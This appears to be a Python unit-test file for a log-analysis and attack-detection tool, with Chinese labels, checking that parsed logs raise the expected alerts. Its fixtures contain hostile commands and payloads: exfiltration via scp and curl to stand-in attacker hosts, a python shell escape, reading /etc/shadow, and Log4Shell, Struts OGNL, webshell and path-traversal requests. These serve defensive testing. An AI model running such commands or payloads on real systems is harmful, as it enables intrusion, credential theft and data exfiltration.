from _support import *


class DetectionRegressionTests(unittest.TestCase):
    def test_high_frequency_success_requests_create_volume_alert(self):
        content = "".join(
            "1.1.1.1 - - [15/Mar/2024:10:00:%02d +0800] "
            "\"GET /index.html HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n" % (i % 60)
            for i in range(120)
        )

        result = parse_web_access(content, "access.log")
        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "自动化扫描/高频访问")

        summary = run_detection(result.events)
        self.assertTrue(any(alert.rule_id == "RECON-003" for alert in summary.alerts))
        self.assertEqual(result.events[0].details.get("event_family"), "reconnaissance")
        self.assertEqual(summary.attack_chain[0].phase, "侦察")

    def test_post_error_web_event_does_not_fall_into_other_phase(self):
        content = (
            "1.1.1.1 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /system.php HTTP/1.1\" 404 10 \"-\" \"Mozilla/5.0\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        self.assertEqual(result.events[0].rule_name, "POST 异常响应 404")
        self.assertEqual(result.events[0].details.get("event_family"), "reconnaissance")
        self.assertEqual(summary.attack_chain[0].phase, "侦察")

    def test_web_recon_alert_uses_recon_phase(self):
        content = (
            "1.1.1.1 - - [15/Mar/2024:10:01:00 +0800] "
            "\"GET /.env HTTP/1.1\" 404 10 \"-\" \"Mozilla/5.0\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        alert = next(item for item in summary.alerts if item.rule_name == "Web攻击: 敏感文件探测")
        self.assertEqual(alert.mitre_attack, "T1083")
        self.assertEqual(alert.mitre_phase, "侦察")

    def test_run_analysis_rdp_only_keeps_logon_type_10_with_remote_source_only(self):
        xml = (
            "<Events>"
            "<Event><System><EventID>4625</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:01.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"IpAddress\">203.0.113.8</Data>"
            "<Data Name=\"LogonType\">3</Data></EventData></Event>"
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:03:00.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"LogonType\">10</Data></EventData></Event>"
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:03:10.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"IpAddress\">8.8.4.4</Data>"
            "<Data Name=\"LogonType\">10</Data></EventData></Event>"
            "<Event><System><EventID>4688</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:04:00.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"NewProcessName\">C:\\Windows\\System32\\cmd.exe</Data></EventData></Event>"
            "</Events>"
        )

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "Security.xml"
            path.write_text(xml, encoding="utf-8")
            general = run_analysis(AnalysisOptions(paths=[str(path)]), quiet=True)
            rdp = run_analysis(AnalysisOptions(paths=[str(path)], rdp_only=True), quiet=True)

        self.assertEqual([event.event_id for event in general.parse_results[0].events], ["4625", "4624", "4624", "4688"])
        result = rdp.parse_results[0]
        self.assertEqual([event.event_id for event in result.events], ["4624"])
        self.assertEqual([event.details.get("source_ip") for event in result.events], ["8.8.4.4"])
        self.assertEqual(result.stats.total, 1)
        self.assertEqual(rdp.summary.total_events, 1)

    def test_attack_chain_uses_response_phase_without_alert_double_counting(self):
        lines = [
            f"Mar 15 10:00:0{i} web sshd[100{i}]: Failed password for alice from 198.51.100.20 port 22 ssh2"
            for i in range(5)
        ]
        lines.append(
            "Mar 15 10:00:06 web sshd[1010]: Accepted password for alice from 198.51.100.20 port 22 ssh2"
        )
        result = parse_linux_auth("\n".join(lines) + "\n", "auth.log")
        summary = run_detection(result.events, profile="cn-hvv")

        chain = {item.phase: item for item in summary.attack_chain}
        self.assertIn("身份突破", chain)
        self.assertEqual(chain["身份突破"].event_count, 6)
        self.assertEqual(chain["身份突破"].techniques, ["T1078", "T1110.001"])
        self.assertNotIn("初始访问", chain)
        self.assertEqual({alert.mitre_phase for alert in summary.alerts}, {"身份突破"})

    def test_cn_hvv_profile_detects_common_domestic_exploit_traces(self):
        content = (
            "2.2.2.2 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /index.action?redirect:%24%7B%23_memberAccess%5B%27allowStaticMethodAccess%27%5D=true%7D HTTP/1.1\" "
            "200 10 \"-\" \"curl/8.0\"\n"
            "2.2.2.3 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )

        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events, profile="cn-hvv")

        self.assertTrue(any(alert.rule_id == "CN-HVV-001" for alert in summary.alerts))
        self.assertTrue(any("cn-hvv" in event.tags for event in result.events))

    def test_shell_history_command_trace_creates_actionable_alerts(self):
        content = "\n".join([
            "whoami",
            "wget https://example.test/linux-exploit-suggester.sh -O les.sh",
            "python -c 'import pty; pty.spawn(\"/bin/sh\")'",
            "sudo -l",
            "find / -type f -user root -perm -4000 2>/dev/null",
            "./usr/bin/python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "cat /etc/shadow",
            "rm /var/www/html/uploads/x.phtml",
        ]) + "\n"

        result = parse_shell_history(content, ".bash_history")
        summary = run_detection(result.events)
        rule_ids = {alert.rule_id for alert in summary.alerts}

        self.assertIn("PRIV-005", rule_ids)
        self.assertIn("EXEC-003", rule_ids)
        self.assertIn("EXEC-004", rule_ids)
        self.assertIn("CRED-003", rule_ids)
        self.assertIn("EVAS-003", rule_ids)
        phases = {item.phase for item in summary.attack_chain}
        self.assertIn("权限提升", phases)
        self.assertIn("凭据访问", phases)
        self.assertIn("防御规避", phases)
        self.assertEqual({event.details.get("source_type") for event in result.events}, {"shell-history"})

    def test_shell_history_data_exfiltration_creates_alert_and_incident(self):
        content = "\n".join([
            "scp /var/backups/db.sql.gz attacker@198.51.100.10:/tmp/db.sql.gz",
            "curl --upload-file /tmp/secrets.tar.gz https://exfil.example/upload",
        ]) + "\n"

        result = parse_shell_history(content, "server01:/home/alice/.bash_history")
        summary = run_detection(result.events)
        alert = next((item for item in summary.alerts if item.rule_id == "EXFIL-001"), None)

        self.assertIsNotNone(alert)
        self.assertEqual(alert.mitre_phase, "数据外传")
        self.assertEqual(alert.level, ThreatLevel.HIGH)
        self.assertEqual(len(alert.affected_events), 2)
        self.assertTrue(any("疑似外传命令" in item for item in summary.recommendations))
        phases = {item.phase for item in summary.attack_chain}
        self.assertIn("数据外传", phases)
        self.assertTrue(any("数据外传" in incident.attack_phases for incident in summary.incidents))

    def test_shell_history_incident_subject_is_actionable_without_asset_context(self):
        content = "cat /etc/shadow\nhistory -c\n"
        result = parse_shell_history(content, ".bash_history")
        summary = run_detection(result.events)

        self.assertTrue(summary.incidents)
        titles = "\n".join(incident.title for incident in summary.incidents)
        descriptions = "\n".join(incident.description for incident in summary.incidents)
        evidence = "\n".join(item for incident in summary.incidents for item in incident.evidence)

        self.assertIn("Shell", titles)
        self.assertNotIn("未知实体", titles)
        self.assertNotIn("未知来源", descriptions)
        self.assertIn("关键命令", descriptions)
        self.assertIn("证据类型: Shell 命令历史", evidence)
        self.assertEqual({incident.confidence for incident in summary.incidents}, {"medium"})

    def test_shell_history_incident_uses_extracted_account_and_asset_context(self):
        result = parse_shell_history("cat /etc/shadow\n", "server01:/home/alice/.zsh_history")
        summary = run_detection(result.events)

        self.assertTrue(summary.incidents)
        titles = "\n".join(incident.title for incident in summary.incidents)
        descriptions = "\n".join(incident.description for incident in summary.incidents)
        evidence = "\n".join(item for incident in summary.incidents for item in incident.evidence)

        self.assertIn("alice 的 Shell 凭据访问轨迹", titles)
        self.assertIn("账号: alice", descriptions)
        self.assertIn("资产: server01", descriptions)
        self.assertIn("核心账号: alice", evidence)
        self.assertIn("资产: server01", evidence)
        self.assertIn("证据类型: Shell 命令历史", evidence)

    def test_allowlist_suppresses_trusted_noise_before_detection(self):
        content = (
            "10.0.0.5 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /health HTTP/1.1\" 403 10 \"-\" \"ELB-HealthChecker\"\n"
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"GET /admin.php HTTP/1.1\" 403 10 \"-\" \"Mozilla/5.0\"\n"
        )
        result = parse_web_access(content, "access.log")

        filtered, suppressed = apply_allowlist([result], {
            "ips": ["10.0.0.5"],
            "paths": ["/health"],
            "user_agents": ["ELB-HealthChecker"],
        })

        self.assertEqual(suppressed, 1)
        self.assertEqual(len(filtered[0].events), 1)
        self.assertEqual(filtered[0].events[0].ip, "9.9.9.9")

    def test_empty_allowlist_objects_do_not_suppress_everything(self):
        event = LogEvent(
            id="evt-allow-1",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="测试",
            source="fixture",
            source_file="events.log",
            message="danger",
            raw_line="danger",
        )
        result = ParseResult("events.log", "Fixture", [event], ParseStats(total=1, high=1))

        for allowlist in ({"suppressions": [{}]}, {"maintenance_windows": [{}]}):
            filtered, suppressed = apply_allowlist([result], allowlist)
            self.assertEqual(suppressed, 0)
            self.assertEqual(len(filtered[0].events), 1)

    def test_dedup_keeps_distinct_alerts_with_same_description_prefix(self):
        """description 前 50 字相同但 affected_events 不同的告警必须保留。"""
        alert_a = DetectionAlert(
            id="a1", rule_id="WEB-SQLI", rule_name="SQL注入",
            description="检测到 5 次 SQL注入 攻击尝试 ……长描述同前缀",
            level=ThreatLevel.HIGH, category="Web攻击",
            mitre_attack="T1190", mitre_phase="初始访问",
            affected_events=["e1", "e2"], evidence=[],
            recommendation="", timestamp="", confidence="high",
        )
        alert_b = DetectionAlert(
            id="a2", rule_id="WEB-SQLI", rule_name="SQL注入",
            description="检测到 5 次 SQL注入 攻击尝试 ……长描述同前缀",
            level=ThreatLevel.HIGH, category="Web攻击",
            mitre_attack="T1190", mitre_phase="初始访问",
            affected_events=["e3"], evidence=[],
            recommendation="", timestamp="", confidence="high",
        )
        result = _dedup_alerts([alert_a, alert_b])
        self.assertEqual(len(result), 2)
        self.assertEqual({a.id for a in result}, {"a1", "a2"})

    def test_private_source_ip_downgrades_brute_force_confidence(self):
        """私网 IP 触发的暴力破解告警 confidence 应当被降级。"""
        # 构造 25 条来自 192.168 私网的 SSH 失败登录
        lines = [
            f"Mar 15 09:00:{i:02d} host sshd[1234]: Failed password for bob from 192.168.10.5 port 22 ssh2"
            for i in range(25)
        ]
        result = parse_linux_auth("\n".join(lines) + "\n", "auth.log")
        summary = run_detection(result.events)
        bf = [a for a in summary.alerts if a.rule_id == "BRUTE-001"]
        self.assertTrue(bf, "应当至少触发一个暴力破解告警")
        # n>=20 公网 IP 时 confidence=high；私网降级为 medium
        self.assertEqual(bf[0].confidence, "medium")
        self.assertTrue(any("内网" in e for e in bf[0].evidence))

    def test_bruteforce_requires_failures_inside_time_window(self):
        spread = [
            LogEvent(
                id=f"bf-spread-{i}",
                timestamp=f"2024-0{i + 1}-01T00:00:00",
                level=ThreatLevel.MEDIUM,
                category="认证",
                source="fixture",
                source_file="auth.log",
                message="failed",
                raw_line="failed",
                ip="198.51.100.10",
                user="alice",
                tags=["failed-login"],
            )
            for i in range(5)
        ]
        burst = [
            LogEvent(
                id=f"bf-burst-{i}",
                timestamp=f"2024-03-15T10:00:{i:02d}",
                level=ThreatLevel.MEDIUM,
                category="认证",
                source="fixture",
                source_file="auth.log",
                message="failed",
                raw_line="failed",
                ip="198.51.100.11",
                user="alice",
                tags=["failed-login"],
            )
            for i in range(5)
        ]

        self.assertFalse(any(alert.rule_id == "BRUTE-001" for alert in run_detection(spread).alerts))
        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in run_detection(burst).alerts))

    def test_password_spray_requires_unique_users_inside_time_window(self):
        spread = [
            LogEvent(
                id=f"spray-spread-{i}",
                timestamp=f"2024-0{i + 1}-01T00:00:00",
                level=ThreatLevel.MEDIUM,
                category="认证",
                source="fixture",
                source_file="auth.log",
                message="failed",
                raw_line="failed",
                ip="198.51.100.12",
                user=f"user{i}",
                tags=["failed-login"],
            )
            for i in range(5)
        ]
        burst = [
            LogEvent(
                id=f"spray-burst-{i}",
                timestamp=f"2024-03-15T10:00:{i:02d}",
                level=ThreatLevel.MEDIUM,
                category="认证",
                source="fixture",
                source_file="auth.log",
                message="failed",
                raw_line="failed",
                ip="198.51.100.13",
                user=f"user{i}",
                tags=["failed-login"],
            )
            for i in range(5)
        ]

        self.assertFalse(any(alert.rule_id == "SPRAY-001" for alert in run_detection(spread).alerts))
        self.assertTrue(any(alert.rule_id == "SPRAY-001" for alert in run_detection(burst).alerts))

    def test_cn_hvv_success_after_bruteforce_requires_order(self):
        success_first = [
            LogEvent(
                id="success-first",
                timestamp="2024-03-15T09:00:00",
                level=ThreatLevel.INFO,
                category="认证",
                source="fixture",
                source_file="auth.log",
                message="success",
                raw_line="success",
                ip="198.51.100.14",
                user="alice",
                tags=["successful-login"],
            )
        ]
        success_first.extend(
            LogEvent(
                id=f"late-failure-{i}",
                timestamp=f"2024-03-15T10:00:{i:02d}",
                level=ThreatLevel.MEDIUM,
                category="认证",
                source="fixture",
                source_file="auth.log",
                message="failed",
                raw_line="failed",
                ip="198.51.100.14",
                user="alice",
                tags=["failed-login"],
            )
            for i in range(5)
        )

        summary = run_detection(success_first, profile="cn-hvv")

        self.assertFalse(any(alert.rule_id == "CN-HVV-002" for alert in summary.alerts))

    def test_private_ip_check_only_matches_rfc1918_ranges(self):
        """保留/文档网段不应当被当作内网地址降级。"""
        self.assertTrue(is_private_ip("10.1.2.3"))
        self.assertTrue(is_private_ip("172.16.0.1"))
        self.assertTrue(is_private_ip("172.31.255.255"))
        self.assertTrue(is_private_ip("192.168.1.1"))
        self.assertFalse(is_private_ip("172.32.0.1"))
        self.assertFalse(is_private_ip("203.0.113.50"))
        self.assertFalse(is_private_ip("198.51.100.70"))

    def test_event_id_generation_is_thread_safe(self):
        reset_counter()
        with ThreadPoolExecutor(max_workers=16) as pool:
            ids = list(pool.map(lambda _i: gen_id("thr"), range(1000)))
        self.assertEqual(len(ids), 1000)
        self.assertEqual(len(set(ids)), 1000)

    def test_ddos_uses_per_minute_window_not_total_count(self):
        """同样总量、不同时间分布：分散一天的访问不算 DDoS，集中一分钟才是。"""
        # 600 条请求分散在 600 分钟里 → 不应触发 DDoS（每分钟仅 1 次）
        spread = "".join(
            "1.1.1.1 - - [15/Mar/2024:%02d:%02d:00 +0800] "
            "\"GET /index.html HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n" % (i // 60, i % 60)
            for i in range(600)
        )
        spread_result = parse_web_access(spread, "access.log")
        ddos_tags = [
            ev for ev in spread_result.events if "ddos" in ev.tags
        ]
        self.assertEqual(ddos_tags, [], "分散一天的访问不应当被识别为 DDoS")

    def test_parser_no_longer_mutates_event_levels_for_aggregation(self):
        """解析层不再回写 brute-force 聚合级别——单条 SSH 失败应保持 MEDIUM。"""
        # 25 条来自同一公网 IP 的 SSH 失败：旧实现解析阶段就会升级到 CRITICAL，
        # 重构后单条事件保持解析期初始 level，告警在 detection 层产出。
        lines = [
            f"Mar 15 09:00:{i:02d} host sshd[1234]: Failed password for bob from 9.9.9.9 port 22 ssh2"
            for i in range(25)
        ]
        result = parse_linux_auth("\n".join(lines) + "\n", "auth.log")
        # 不应该有一条事件被解析层标记为 CRITICAL
        self.assertEqual(
            sum(1 for e in result.events if e.level == ThreatLevel.CRITICAL), 0,
            "解析层不应该自己升级 CRITICAL，告警由 detection 层负责"
        )
        # detection 层仍要能产出告警
        summary = run_detection(result.events)
        self.assertTrue(any(a.rule_id == "BRUTE-001" for a in summary.alerts))

    def test_sudo_shell_event_is_promoted_to_alert_and_incident(self):
        content = (
            "Mar 15 09:15:00 web sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; "
            "USER=root ; COMMAND=/bin/bash\n"
        )
        result = parse_linux_auth(content, "auth.log")
        summary = run_detection(result.events)

        self.assertTrue(any(alert.rule_id == "PRIV-004" for alert in summary.alerts))
        self.assertTrue(summary.incidents)
        self.assertIn("权限提升", summary.incidents[0].attack_phases)

    def test_thresholds_can_be_overridden_at_runtime(self):
        """通过 set_thresholds 临时降低阈值，让小样本也能触发暴力破解告警。"""
        original = THRESHOLDS
        try:
            set_thresholds(Thresholds(
                brute_force_min=2,
                brute_force_high=2,
                brute_force_critical=10,
            ))
            lines = [
                f"Mar 15 09:00:{i:02d} host sshd[1234]: "
                f"Failed password for bob from 9.9.9.9 port 22 ssh2"
                for i in range(3)
            ]
            result = parse_linux_auth("\n".join(lines) + "\n", "auth.log")
            summary = run_detection(result.events)
            self.assertTrue(any(a.rule_id == "BRUTE-001" for a in summary.alerts))
        finally:
            set_thresholds(original)

    def test_thresholds_load_from_json_file_with_partial_override(self):
        """阈值文件只覆盖指定字段，其余保留默认。"""
        with tempfile.TemporaryDirectory() as tmp:
            cfg_path = Path(tmp) / "th.json"
            cfg_path.write_text(_json.dumps({"brute_force_critical": 99}), encoding="utf-8")
            loaded = load_thresholds(str(cfg_path))
        self.assertEqual(loaded.brute_force_critical, 99)
        # 其它字段沿用默认
        self.assertEqual(loaded.spray_min_unique_users, THRESHOLDS.spray_min_unique_users)

    def test_threshold_validation_rejects_invalid_ranges(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg_path = Path(tmp) / "bad-thresholds.json"
            cfg_path.write_text(
                _json.dumps({"brute_force_min": 10, "brute_force_high": 3}),
                encoding="utf-8",
            )
            with self.assertRaisesRegex(ValueError, "brute_force_high"):
                load_thresholds(str(cfg_path))

        with self.assertRaisesRegex(ValueError, "generic_parse_line_limit"):
            validate_thresholds(Thresholds(generic_parse_line_limit=0))

    def test_threshold_env_and_config_merge_without_global_state_leak(self):
        with tempfile.TemporaryDirectory() as tmp:
            log_path = Path(tmp) / "auth.log"
            log_path.write_text(
                "\n".join(
                    f"Mar 15 09:00:{i:02d} host sshd[1234]: Failed password for bob from 198.51.100.40 port 22 ssh2"
                    for i in range(4)
                ) + "\n",
                encoding="utf-8",
            )
            cfg_path = Path(tmp) / "thresholds.json"
            cfg_path.write_text(_json.dumps({"brute_force_min": 4}), encoding="utf-8")

            try:
                with mock.patch.dict(os.environ, {
                    "BLA_THRESHOLD_BRUTE_FORCE_MIN": "99",
                    "BLA_THRESHOLD_BRUTE_FORCE_HIGH": "6",
                }):
                    result = run_analysis(AnalysisOptions(paths=[str(log_path)], config_path=str(cfg_path)), quiet=True)
            finally:
                set_thresholds(DEFAULT_THRESHOLDS)

        alert = next(item for item in result.summary.alerts if item.rule_id == "BRUTE-001")
        self.assertEqual(alert.level, ThreatLevel.MEDIUM)
        self.assertEqual(load_thresholds_from_env(DEFAULT_THRESHOLDS).brute_force_min, DEFAULT_THRESHOLDS.brute_force_min)

    def test_credential_access_detector_uses_selector(self):
        from bla.detection.engine import get_default_detector_registry

        registry = get_default_detector_registry()
        spec = next(item for item in registry.list() if item.name == "credential-access")
        self.assertIsNotNone(spec.selector)

        noise = LogEvent(
            id="noise",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.INFO,
            category="认证",
            source="fixture",
            source_file="auth.log",
            message="failed login",
            raw_line="failed login",
            tags=["failed-login"],
        )
        credential = LogEvent(
            id="cred",
            timestamp="2024-03-15T10:00:01",
            level=ThreatLevel.HIGH,
            category="Shell",
            source="fixture",
            source_file=".bash_history",
            message="cat /etc/shadow",
            raw_line="cat /etc/shadow",
            tags=["credential-access", "linux-credential-file"],
        )
        selected = spec.select_events(DetectionEventIndex([noise, credential]))
        self.assertEqual([event.id for event in selected], ["cred"])

    def test_builtin_yaml_web_rule_detects_log4shell(self):
        """内置 YAML 规则应参与 Web 检测。"""
        content = (
            "203.0.113.8 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.test%2Fa%7D HTTP/1.1\" "
            "200 10 \"-\" \"curl/8\"\n"
        )
        result = parse_web_access(content, "access.log")
        self.assertEqual(result.events[0].rule_name, "Log4Shell/JNDI 探测")
        self.assertIn("log4shell", result.events[0].tags)

    def test_custom_yaml_rules_can_extend_web_detection(self):
        """用户自定义 YAML 规则目录可扩展 Web 检测，无需改 Python 源码。"""
        with tempfile.TemporaryDirectory() as tmp:
            rules_dir = Path(tmp) / "rules"
            rules_dir.mkdir()
            (rules_dir / "web_custom.yaml").write_text(
                """
web_attacks:
  - id: WEB-CUSTOM-UNIT
    name: 单元测试自定义规则
    level: high
    category: Web攻击
    mitre: T1190
    tags: [custom-test, web-attack]
    patterns:
      - 'unit-test-probe'
""",
                encoding="utf-8",
            )
            set_rule_dirs([str(rules_dir)])
            try:
                content = (
                    "7.7.7.7 - - [15/Mar/2024:10:00:00 +0800] "
                    "\"GET /unit-test-probe HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
                )
                result = parse_web_access(content, "access.log")
            finally:
                set_rule_dirs([])
                reset_rule_cache()

        self.assertEqual(result.events[0].rule_name, "单元测试自定义规则")
        self.assertIn("custom-test", result.events[0].tags)
        summary = run_detection(result.events)
        alert = next(a for a in summary.alerts if a.rule_name == "Web攻击: 单元测试自定义规则")
        self.assertEqual(alert.rule_id, "WEB-CUSTOM-UNIT")

    def test_invalid_custom_yaml_rule_fails_fast(self):
        with tempfile.TemporaryDirectory() as tmp:
            rules_dir = Path(tmp) / "rules"
            rules_dir.mkdir()
            (rules_dir / "bad.yaml").write_text(
                """
web_attacks:
  - id: WEB-BAD
    name: Bad regex
    severity: high
    mitre: T1190
    tags: [bad]
    patterns:
      - '['
""",
                encoding="utf-8",
            )
            try:
                with self.assertRaises(ValueError):
                    set_rule_dirs([str(rules_dir)])
            finally:
                set_rule_dirs([])
                reset_rule_cache()

    def test_detector_registry_can_run_custom_detector_set(self):
        """检测层应允许替换/扩展 detector 列表，而不是只能改 engine.py。"""
        event = LogEvent(
            id="e-reg",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="测试",
            source="fixture",
            source_file="events.log",
            message="danger",
            raw_line="danger",
        )

        def _fixture_detector(events):
            return [DetectionAlert(
                id="a-reg",
                rule_id="REG-001",
                rule_name="Registry detector",
                description=f"custom detector saw {len(events)} event(s)",
                level=ThreatLevel.HIGH,
                category="测试",
                mitre_attack="T1190",
                mitre_phase="初始访问",
                affected_events=[events[0].id],
                evidence=["custom evidence"],
                recommendation="custom recommendation",
                timestamp=events[0].timestamp,
                confidence="high",
            )]

        registry = DetectorRegistry()
        registry.register(DetectorSpec("fixture", _fixture_detector))

        self.assertIn("web-attacks", list_detector_names())
        summary = run_detection([event], pre_enriched=True, detector_registry=registry)
        self.assertEqual([alert.rule_id for alert in summary.alerts], ["REG-001"])

    def test_detector_registry_selector_limits_candidate_events(self):
        hot = LogEvent(
            id="hot",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="测试",
            source="fixture",
            source_file="events.log",
            message="hot",
            raw_line="hot",
            tags=["fixture-hot"],
        )
        noise = LogEvent(
            id="noise",
            timestamp="2024-03-15T10:00:01",
            level=ThreatLevel.INFO,
            category="噪声",
            source="fixture",
            source_file="events.log",
            message="noise",
            raw_line="noise",
        )
        seen_counts = []

        def _fixture_detector(events):
            seen_counts.append(len(events))
            return [DetectionAlert(
                id="a-select",
                rule_id="REG-SEL-001",
                rule_name="Registry selector",
                description=f"saw {len(events)} selected event(s)",
                level=ThreatLevel.HIGH,
                category="测试",
                mitre_attack="T1190",
                mitre_phase="初始访问",
                affected_events=[event.id for event in events],
                evidence=["selector evidence"],
                recommendation="selector recommendation",
                timestamp=events[0].timestamp,
                confidence="high",
            )]

        registry = DetectorRegistry()
        registry.register(DetectorSpec("fixture-select", _fixture_detector, selector=lambda index: index.tags_any("fixture-hot")))

        summary = run_detection([noise, hot], pre_enriched=True, detector_registry=registry)

        self.assertEqual(seen_counts, [1])
        self.assertEqual(summary.alerts[0].affected_events, ["hot"])

    def test_timeline_is_chronological_not_severity_sorted(self):
        early_medium = LogEvent(
            id="early",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.MEDIUM,
            category="测试",
            source="fixture",
            source_file="events.log",
            message="early",
            raw_line="early",
            mitre_attack="T1595",
        )
        late_critical = LogEvent(
            id="late",
            timestamp="2024-03-15T10:05:00",
            level=ThreatLevel.CRITICAL,
            category="测试",
            source="fixture",
            source_file="events.log",
            message="late",
            raw_line="late",
            mitre_attack="T1190",
        )

        summary = run_detection([late_critical, early_medium])

        self.assertEqual([item.event_id for item in summary.timeline[:2]], ["early", "late"])

    def test_sample_access_log_does_not_create_near_duplicate_incidents(self):
        path = Path(__file__).parents[1] / "sample_logs" / "access.log"
        result = auto_parse(str(path))
        summary = run_detection(result.events)

        for idx, left in enumerate(summary.incidents):
            left_events = set(left.affected_events)
            for right in summary.incidents[idx + 1:]:
                right_events = set(right.affected_events)
                smaller = min(len(left_events), len(right_events))
                overlap = len(left_events & right_events)
                self.assertLess(overlap / smaller if smaller else 0, 0.8)

    def test_incident_attack_phases_follow_kill_chain_order(self):
        """incident.attack_phases 必须按 ATT&CK kill chain 顺序，不是字母序。"""
        from bla.detection.correlation import KILL_CHAIN_ORDER, correlate_incidents
        from bla.models import LogEvent as _LE

        def _ev(ev_id: str, family: str, level: ThreatLevel) -> _LE:
            return _LE(
                id=ev_id, timestamp="2026-05-08T10:00:00", level=level,
                category="测试", source="t", source_file="t.log",
                message=f"{family} 事件", raw_line="",
                ip="9.9.9.9", user="alice", host="host1",
                details={
                    "src_ip": "9.9.9.9", "account": "alice", "asset": "host1",
                    "event_family": family, "source_type": "waf",
                },
            )

        # 故意制造命令控制 / 初始访问 / 主机失陷 三个阶段，按字母 / 拼音
        # 它们的顺序绝对不会等于 ATT&CK kill chain 顺序，便于反向证明。
        events = [
            _ev("e1", "command-control", ThreatLevel.CRITICAL),
            _ev("e2", "initial-access", ThreatLevel.HIGH),
            _ev("e3", "compromise", ThreatLevel.CRITICAL),
        ]
        incidents = correlate_incidents(events, [])
        self.assertTrue(incidents, "应至少产出一个 incident")
        phases = incidents[0].attack_phases
        self.assertEqual(phases, ["初始访问", "主机失陷", "命令控制"])
        self.assertEqual(len(phases), len(set(phases)),
                         "incident 阶段不应有重复")
        # KILL_CHAIN_ORDER 顺序约束（防止后续误改）
        self.assertLess(KILL_CHAIN_ORDER.index("初始访问"),
                        KILL_CHAIN_ORDER.index("主机失陷"))
        self.assertLess(KILL_CHAIN_ORDER.index("主机失陷"),
                        KILL_CHAIN_ORDER.index("命令控制"))

    def test_incident_correlation_merges_overlapping_alert_groups(self):
        from bla.detection.correlation import correlate_incidents

        events = [
            LogEvent(
                id=f"corr-{i}",
                timestamp=f"2024-03-15T10:0{i}:00",
                level=ThreatLevel.HIGH,
                category="测试",
                source="fixture",
                source_file="events.log",
                message="event",
                raw_line="event",
                ip="198.51.100.60",
                user="alice" if i < 3 else "bob",
                host="web1",
                details={"src_ip": "198.51.100.60", "account": "alice" if i < 3 else "bob", "asset": "web1", "source_type": "waf", "event_family": "initial-access"},
            )
            for i in range(4)
        ]
        alert_a = DetectionAlert(
            id="corr-a", rule_id="CORR-A", rule_name="A", description="A",
            level=ThreatLevel.HIGH, category="测试", mitre_attack="T1190", mitre_phase="初始访问",
            affected_events=["corr-0", "corr-1"], evidence=[], recommendation="", timestamp="2024-03-15T10:01:00", confidence="high",
        )
        alert_b = DetectionAlert(
            id="corr-b", rule_id="CORR-B", rule_name="B", description="B",
            level=ThreatLevel.HIGH, category="测试", mitre_attack="T1190", mitre_phase="初始访问",
            affected_events=["corr-1", "corr-2"], evidence=[], recommendation="", timestamp="2024-03-15T10:02:00", confidence="high",
        )

        incidents = correlate_incidents(events, [alert_a, alert_b])

        self.assertEqual(len(incidents), 1)
        self.assertEqual(set(incidents[0].affected_alerts), {"corr-a", "corr-b"})
        self.assertIn("corr-2", incidents[0].affected_events)

    def test_analysis_pipeline_can_be_called_directly(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "access.log"
            path.write_text(
                "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
                "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n",
                encoding="utf-8",
            )
            result = run_analysis(AnalysisOptions(paths=[str(path)]))

        self.assertEqual(len(result.parse_results), 1)
        self.assertGreaterEqual(len(result.summary.alerts), 1)
        self.assertEqual(result.summary.files_analyzed, 1)
